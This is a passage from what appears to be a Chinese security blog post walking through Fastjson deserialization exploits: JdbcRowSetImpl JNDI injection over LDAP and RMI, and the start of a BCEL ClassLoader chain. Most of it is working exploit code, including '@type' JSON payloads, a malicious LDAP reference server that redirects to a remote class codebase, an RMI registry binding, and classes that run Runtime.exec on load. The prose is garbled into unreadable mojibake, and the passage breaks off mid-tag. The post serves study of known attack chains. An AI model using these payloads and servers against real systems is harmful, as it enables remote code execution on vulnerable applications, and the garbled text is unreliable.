class="title class_">JdbcRowSetImplPOC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:8085/jhLlcFdL\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈáåÂà©Áî®ÁöÑÊòØyakitÂèçËøûÊúçÂä°‰Ωú‰∏∫serverÔºåÊØîËæÉÊñπ‰æø<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212137308.png" alt="image-20230821213716194"><br>ËÉΩÊé•Êî∂Âà∞ldapÁöÑËØ∑Ê±ÇÔºå‰ΩÜÂ∞±ÊòØÂºπ‰∏çÂá∫ËÆ°ÁÆóÂô®ÔºåÊä•ÈîôÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212137198.png" alt="image-20230821213725971"><br>ËÆæÁΩÆautoCommitÂ±ûÊÄßÈîôËØØÔºå‰∏çÁü•ÈÅìÂëΩ‰ª§ÊâßË°åÂ§±Ë¥•ÊòØ‰∏çÊòØÂõ†‰∏∫Ëøô‰∏™Êä•ÈîôÔºåÁî±‰∫éÂ§çÁé∞Â§±Ë¥•‰πü‰∏çÊÉ≥Ë∞ÉËØïÂàÜÊûê‰∫ÜÔºåÂêéÈù¢ÂèàÁúã‰∫ÜÁúãÁõ¥Êé•Ë∑≥Âà∞‰∫Ü‰∏ãÈù¢ËøôÈáåÊäõÂá∫InvocationTargetExceptionÂºÇÂ∏∏Ôºå‰ΩÜÊòØ‰∏çÁü•ÈÅìÊÄé‰πàËß£ÂÜ≥<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212137289.png" alt="image-20230821213750166"><br>Âõ†‰∏∫ÊâìÁöÑÊòØjndiÊ≥®ÂÖ•ÔºåÊâÄ‰ª•Âà©Áî®Êù°‰ª∂‰∏ÄÊ†∑Ôºå‰πüÂøÖÈ°ªË¶ÅÂá∫ÁΩë„ÄÇ<br>ÂêéÈù¢ÂèàÁúã‰∫ÜÁúãÔºåÊç¢‰∫Ü‰∏™ÊñπÂºèÊù•ÊâìÔºåËá™Â∑±Ëµ∑ÊúçÂä°‰∏ç‰ΩøÁî®yakitÔºåÈ¶ñÂÖàÁîüÊàê‰∏Ä‰∏™ÊÅ∂ÊÑèÂ≠óËäÇÁ†Å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‰∏äÈù¢Ëøô‰∏™Âà©Áî®javacÁºñËØë‰∏∫classÊñá‰ª∂ÔºåÁÑ∂ÂêéÂà©Áî®pythonËµ∑‰∏Ä‰∏™ÊúçÂä°ÔºåËÆ∞ÂæóËµ∑pythonÊúçÂä°ÁöÑË∑ØÂæÑË¶ÅÂíåclassÊñá‰ª∂Ë∑ØÂæÑ‰∏ÄÊ†∑‰∏çÁÑ∂ËØªÂèñ‰∏çÂà∞classÊñá‰ª∂</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m http.server</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéËµ∑ÊúçÂä°Á´Ø‰ª£Á†Å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;  </span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;  </span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;  </span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;  </span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;  </span><br><span class="line"><span class="keyword">import</span> java.net.URL;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LdapServer</span> &#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://127.0.0.1:8000/#test&quot;</span>;  </span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1099</span>;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);  </span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(  </span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,  </span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),  </span><br><span class="line">                    port,  </span><br><span class="line">                    ServerSocketFactory.getDefault(),  </span><br><span class="line">                    SocketFactory.getDefault(),  </span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));  </span><br><span class="line">  </span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>(<span class="keyword">new</span> <span class="title class_">URL</span>(url)));  </span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);  </span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);  </span><br><span class="line">            ds.startListening();  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;  </span><br><span class="line">        <span class="keyword">private</span> URL codebase;  </span><br><span class="line">        <span class="comment">/**  </span></span><br><span class="line"><span class="comment">         * */</span> <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">( URL cb )</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.codebase = cb;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="comment">/**  </span></span><br><span class="line"><span class="comment">         * &#123;<span class="doctag">@inheritDoc</span>&#125;  </span></span><br><span class="line"><span class="comment">         * * <span class="doctag">@see</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)  </span></span><br><span class="line"><span class="comment">         */</span> <span class="meta">@Override</span>  </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();  </span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);  </span><br><span class="line">            <span class="keyword">try</span> &#123;  </span><br><span class="line">                sendResult(result, base, e);  </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;  </span><br><span class="line">                e1.printStackTrace();  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;  </span><br><span class="line">            <span class="type">URL</span> <span class="variable">turl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="built_in">this</span>.codebase, <span class="built_in">this</span>.codebase.getRef().replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).concat(<span class="string">&quot;.class&quot;</span>));  </span><br><span class="line">            System.out.println(<span class="string">&quot;Send LDAP reference result for &quot;</span> + base + <span class="string">&quot; redirecting to &quot;</span> + turl);  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);  </span><br><span class="line">            <span class="type">String</span> <span class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();  </span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);  </span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;  </span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);  </span><br><span class="line">            &#125;  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, cbstring);  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);  </span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, <span class="built_in">this</span>.codebase.getRef());  </span><br><span class="line">            result.sendSearchEntry(e);  </span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊîªÂáªÁöÑexpÔºåÂõ†‰∏∫ÊòØËá™Â∑±Êú¨Âú∞Ëµ∑ÁöÑÊúçÂä°ÊâÄ‰ª•Âú®Á´ØÂè£Á®çÂæÆ‰∏çÂêåÔºåÂêéÈù¢ÁöÑremoteObjÊó†ÊâÄË∞ì‰∏ç‰∏∫Á©∫Â∞±Ë°å</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImplPOC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/remoteObj\&quot;,\&quot;autoCommit\&quot;:false&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212138907.png" alt="image-20230821213817470"><br>ËøôÈáå‰πüÂèØ‰ª•ÁúãÂà∞‰∏äÈù¢ÁöÑÊä•ÈîôÊòØÊ≠£Â∏∏Êä•ÈîôÔºåÂíåÂëΩ‰ª§ÊâßË°åÊó†ÂÖ≥</p><h3 id="2-JNDI-RMI"><a href="#2-JNDI-RMI" class="headerlink" title="2.JNDI+RMI"></a>2.JNDI+RMI</h3><p>RMIÊîªÂáªÁöÑexpÊääÂçèËÆÆÊç¢‰∏Ä‰∏ãÂ∞±Ë°åÔºåÊúçÂä°Á´Ø‰∏ç‰∏ÄÊ†∑Â¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;  </span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">        <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();  </span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);  </span><br><span class="line">        <span class="type">Reference</span> <span class="variable">reference</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="string">&quot;test&quot;</span>,<span class="string">&quot;test&quot;</span>,<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);  </span><br><span class="line">        initialContext.rebind(<span class="string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊîªÂáªÁöÑexpÔºårmiËøôÈáåÂøÖÈ°ª‰∏∫remoteObjÔºårmiËøôÂùóÂÑøÊ≤°Â≠¶Â•ΩÔºåÊé•Âè£ËøôÈáåÊúâÁÇπËø∑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// Âü∫‰∫é JdbcRowSetImpl ÁöÑÂà©Áî®Èìæ  </span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIPayload</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://localhost:1099/remoteObj\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212138821.png" alt="image-20230821213838383"><br>ÂêåÊ†∑‰πüÂèØ‰ª•Âà©Áî®Â∑•ÂÖ∑marshalsecÊù•Ëµ∑ÊúçÂä°Ôºå‰ΩÜÊòØÊàëÂà©Áî®Â§±Ë¥•‰∫ÜÂ∞±‰∏çÊºîÁ§∫‰∫Ü</p><h2 id="Âü∫‰∫éBCELÁöÑÂà©Áî®Èìæ"><a href="#Âü∫‰∫éBCELÁöÑÂà©Áî®Èìæ" class="headerlink" title="Âü∫‰∫éBCELÁöÑÂà©Áî®Èìæ"></a>Âü∫‰∫éBCELÁöÑÂà©Áî®Èìæ</h2><p>ÂÖàÁúã‰∏ãBCELÊòØ‰ªÄ‰πàÂêßÔºåÁÑ∂ÂêéÊäätomcatÁöÑ‰æùËµñÂØºËøõÊù•ÂêéÈù¢‰ºöÁî®Âà∞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;tomcat-dbcp&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">9.0</span><span class="number">.8</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><h3 id="BCEL"><a href="#BCEL" class="headerlink" title="BCEL"></a>BCEL</h3><p>BCELÁöÑÂÖ®ÂêçÊòØApache Commons BCELÔºåÂ±û‰∫éApache CommonsÈ°πÁõÆ‰∏ãÁöÑ‰∏Ä‰∏™Â≠êÈ°πÁõÆÔºåCCÈìæ‰πüÂ∞±ÊòØ‰ªé<code>Apache Commons</code>‰∫ßÁîüÁöÑ„ÄÇ</p><p>BCELÂ∫ìÊèê‰æõ‰∫Ü‰∏ÄÁ≥ªÂàóÁî®‰∫éÂàÜÊûê„ÄÅÂàõÂª∫„ÄÅ‰øÆÊîπJava ClassÊñá‰ª∂ÁöÑAPI„ÄÇ‰∏ªË¶ÅÁî®Êù•Â∞ÜxmlÊñáÊ°£ËΩ¨‰∏∫classÊñá‰ª∂„ÄÇÁºñËØëÂêéÁöÑclassË¢´Áß∞‰∏∫transletÔºåÂèØ‰ª•Âú®ÂêéÁª≠Áî®‰∫éÂØπXMLÊñá‰ª∂ÁöÑËΩ¨Êç¢„ÄÇËØ•Â∫ìÂ∑≤ÁªèÂÜÖÁΩÆÂú®‰∫ÜJDK‰∏≠„ÄÇÂÖ≥‰∫éBCELÂÖ∑‰ΩìËØ¶ÊÉÖÂèØÂèÇËÄÉ<code>https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html</code>„ÄÇ<br>ËøôÈáåÂÖàÁÆÄÂçïÁúã‰∏ãÊÄé‰πàÂà©Áî®BCELÊù•ÂëΩ‰ª§ÊâßË°å<br>BCEL‰∏≠Êúâ‰∏Ä‰∏™Á±ª<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>ÔºåÊòØ‰∏Ä‰∏™ClassLoaderÔºåÈáçÂÜô‰∫Ü<code>loadClass</code>ÊñπÊ≥ï„ÄÇÂú®<code>ClassLoader#loadClass()</code>‰∏≠ÔºåÂÖ∂‰ºöÂà§Êñ≠Á±ªÂêçÊòØÂê¶ÊòØ<code>$$BCEL$$</code>ÂºÄÂ§¥ÔºåÂ¶ÇÊûúÊòØÁöÑËØùÔºåÂ∞Ü‰ºöÂØπËøô‰∏™Â≠óÁ¨¶‰∏≤ËøõË°ådecode„ÄÇ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212139533.png" alt="image-20230821213912306"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212139099.png" alt="image-20230821213938865"><br>ÁÑ∂ÂêéÁî®‰∏Ä‰∏™Â∞èDomeÁÆÄÂçïË∞ÉËØï‰∏Ä‰∏ã<br>ÊÅ∂ÊÑèÁ±ª</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÊµãËØïDome</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> FastjsonPoc;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.Repository;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.JavaClass;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;  </span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.util.ClassLoader;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, IllegalAccessException, InstantiationException &#123;  </span><br><span class="line">        <span class="comment">//‰ΩøÁî®BCEL(Byte Code Engineering Library)ÁöÑRepositoryÁ±ªÁöÑlookupClassÊñπÊ≥ïÔºå  </span></span><br><span class="line">        <span class="comment">// Â∞ùËØï‰ªéÁ±ªË∑ØÂæÑ‰∏≠Êü•ÊâæÂêç‰∏∫ &#x27;calc.class&#x27; ÁöÑÁ±ªÔºåÂπ∂ËøîÂõû‰∏Ä‰∏™ JavaClass ÂØπË±°„ÄÇ  </span></span><br><span class="line">        <span class="comment">//&#x27;JavaClass&#x27; ÊòØ BCEL Êèê‰æõÁöÑÁ±ªÔºåÁî®‰∫éË°®Á§∫Â∑≤Âä†ËΩΩÁöÑ Java Á±ª„ÄÇ  </span></span><br><span class="line">        <span class="type">JavaClass</span> <span class="variable">cls</span> <span class="operator">=</span> Repository.lookupClass(Evil.class);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//‰ΩøÁî® BCEL Êèê‰æõÁöÑ &#x27;Utility&#x27; Á±ªÁöÑ &#x27;encode&#x27; ÊñπÊ≥ïÔºåÂ∞ÜÂ≠óËäÇÁ†Å‰ΩøÁî®base64ËøõË°åÁºñÁ†ÅÔºö  </span></span><br><span class="line">        <span class="comment">// &#x27;cls.getBytes()&#x27; ËøîÂõûË°®Á§∫ &#x27;calc.class&#x27; Â≠óËäÇÁ†ÅÁöÑÂ≠óËäÇÊï∞ÁªÑÔºõtrueË°®Á§∫ÁºñÁ†ÅËøáÁ®ã‰∏≠ËøõË°åÂàÜÂâ≤  </span></span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> Utility.encode(cls.getBytes(),<span class="literal">true</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;$$BCEL$$&quot;</span>+code);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//ÂàõÂª∫‰∫Ü‰∏Ä‰∏™ClassLoaderÂØπË±°ÔºåË∞ÉÁî®ÂÖ∂loadClassÊñπÊ≥ï  </span></span><br><span class="line">        <span class="comment">//loadClassÊñπÊ≥ïÁî®‰∫éÂä†ËΩΩÁ±ªÔºåÊé•Êî∂‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÂèÇÊï∞Ë°®Á§∫Ë¶ÅÂä†ËΩΩÁöÑÁ±ªÁöÑÂêçÁß∞  </span></span><br><span class="line">        <span class="comment">// (ËøôÈáåÁöÑÁ±ªÈÄöËøáÂ∞Ü&#x27;$$BCEL$$&#x27;Â≠óÁ¨¶‰∏≤ÂíåÂèòÈáè&#x27;code&#x27;ÊãºÊé•ÂæóÂà∞),ÂÜçÈÄöËøáË∞ÉÁî®.newInstanceÊñπÊ≥ïÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁöÑÂØπË±°  </span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ClassLoader</span>().loadClass(<span class="string">&quot;$$BCEL$$&quot;</span>+code).newInstance();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308212140749.png" alt="image-20230821213957427"><br>Áõ¥Êé•Áúã‰∏ãÈù¢ËøôÈáå<br><img 